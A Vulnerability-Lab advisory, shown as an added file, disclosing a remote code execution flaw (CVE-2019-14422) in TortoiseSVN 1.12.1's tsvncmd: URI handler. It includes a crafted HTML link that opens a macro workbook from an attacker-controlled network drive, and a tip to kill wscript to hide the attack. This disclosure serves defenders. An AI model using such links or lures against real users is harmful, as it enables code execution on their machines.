@@ -1,0 +1,194 @@
+Document Title:
+===============
+TortoiseSVN v1.12.1 - Remote Code Execution Vulnerability
+
+
+References (Source):
+====================
+https://www.vulnerability-lab.com/get_content.php?id=2188
+
+Product:
+https://osdn.net/projects/tortoisesvn/storage/1.12.1/Application/TortoiseSVN-1.12.1.28628-x64-svn-1.12.2.msi/
+
+Ticket: https://groups.google.com/forum/#!forum/tortoisesvn
+
+http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2019-14422
+
+CVE-ID:
+=======
+CVE-2019-14422
+
+
+Release Date:
+=============
+2019-08-13
+
+
+Vulnerability Laboratory ID (VL-ID):
+====================================
+2188
+
+
+Common Vulnerability Scoring System:
+====================================
+8.8
+
+
+Vulnerability Class:
+====================
+Code Execution
+
+
+Current Estimated Price:
+========================
+4.000€ - 5.000€
+
+
+Product & Service Introduction:
+===============================
+TortoiseSVN is a really easy to use Revision control / version control /
+source control software for Windows.
+It is based on Apache Subversion (SVN); TortoiseSVN provides a nice and
+easy user interface for Subversion.
+It is developed under the GPL. Which means it is completely free for
+anyone to use, including in a commercial
+environment, without any restriction. The source code is also freely
+available, so you can even develop your
+own version if you wish to. Since it's not an integration for a specific
+IDE like Visual Studio, Eclipse or
+others, you can use it with whatever development tools you like, and
+with any type of file.
+
+(Copy of the about page: https://tortoisesvn.net/about.html )
+
+
+Abstract Advisory Information:
+==============================
+A vulnerability laboratory researcher (vxrl team) discovered a remote
+code execution vulnerability in the TortoiseSVN v1.12.1 software.
+
+
+Vulnerability Disclosure Timeline:
+==================================
+2019-08-13: Public Disclosure (Vulnerability Laboratory)
+
+Affected Product(s):
+====================
+TortoiseSVN
+Product: TortoiseSVN - Software 1.12.1
+
+
+Discovery Status:
+=================
+Published
+
+
+Exploitation Technique:
+=======================
+Remote
+
+
+Severity Level:
+===============
+High
+
+
+Authentication Type:
+====================
+Pre auth - no privileges
+
+
+User Interaction:
+=================
+Low User Interaction
+
+
+Disclosure Type:
+================
+Independent Security Research
+
+
+Technical Details & Description:
+================================
+A remote code execution vulnerability has been uncovered in the official
+TortoiseSVN v1.12.1 software.
+The vulnerability typ allows remote attackers to execute arbitrary codes
+to compromise a target computer system.
+
+The URI handler of TortoiseSVN (Tsvncmd:) allows a customised diff
+operation on Excel workbooks, which could be used to open remote
+workbooks without protection from macro security settings to execute
+arbitrary code.
+
+The `tsvncmd:command:diff?path:[file1]?path2:[file2]` will execute a
+customised diff on [file1] and [file2] based on the file extension.
+For xls files, it will execute the script `diff-xls.js` using wscript,
+which will open the two files for analysis without any macro
+security warning. An attacker can exploit this by putting a macro virus
+in a network drive, and force the victim to open the workbooks
+and execute the macro inside. Since the macro is triggered through
+wscript, to make the attack less visible, one could kill the wscript
+process and quit the excel program after the code was executed.
+
+
+Proof of Concept (PoC):
+=======================
+The vulnerability could be triggered by visiting a specially crafted URL
+via web browser.
+To reproduce the vulnerability, one could simply create a .url file or
+open the URL with a browsers,
+but a notification prompt may be shown for the latter case.
+
+<a
+href='tsvncmd:command:diff?path:VBoxSvrvv.xlsm?path2:VBoxSvrvw.xlsx'>Checkout
+the Repo with TortoiseSVN</a>
+
+where VBoxSvrv is the remote network drive controlled by the attacker,
+v.xlsm is the macro virus and w.xlsx is just an empty excel workbook.
+
+Sources: https://www.vulnerability-lab.com/resources/documents/2188.rar
+Password: 23vxrl23
+
+PoC: Video
+https://www.youtube.com/watch?v=spvRSC377vI
+
+
+Security Risk:
+==============
+The security risk of the remote code execution vulnerability in the
+software component is estimated as high.
+
+
+Credits & Authors:
+==================
+PingFanZettaKe [VXRL Team] -
+https://www.vulnerability-lab.com/show.php?user=PingFanZettaKe
+
+
+Disclaimer & Information:
+=========================
+The information provided in this advisory is provided as it is without
+any warranty. Vulnerability Lab disclaims all warranties,
+either expressed or implied, including the warranties of merchantability
+and capability for a particular purpose. Vulnerability-Lab
+or its suppliers are not liable in any case of damage, including direct,
+indirect, incidental, consequential loss of business profits
+or special damages, even if Vulnerability-Lab or its suppliers have been
+advised of the possibility of such damages. Some states do
+not allow the exclusion or limitation of liability for consequential or
+incidental damages so the foregoing limitation may not apply.
+We do not approve or encourage anybody to break any licenses, policies,
+deface websites, hack into databases or trade with stolen data.
+
+Domains:    www.vulnerability-lab.com		www.vuln-lab.com			
+www.vulnerability-db.com
+Services:   magazine.vulnerability-lab.com
+paste.vulnerability-db.com 			infosec.vulnerability-db.com
+Social:	    twitter.com/vuln_lab		facebook.com/VulnerabilityLab 		
+youtube.com/user/vulnerability0lab
+Feeds:	    vulnerability-lab.com/rss/rss.php
+vulnerability-lab.com/rss/rss_upcoming.php
+vulnerability-lab.com/rss/rss_news.php
+Programs:   vulnerability-lab.com/submit.php
+vulnerability-lab.com/register.php
+vulnerability-lab.com/list-of-bug-bounty-programs.php
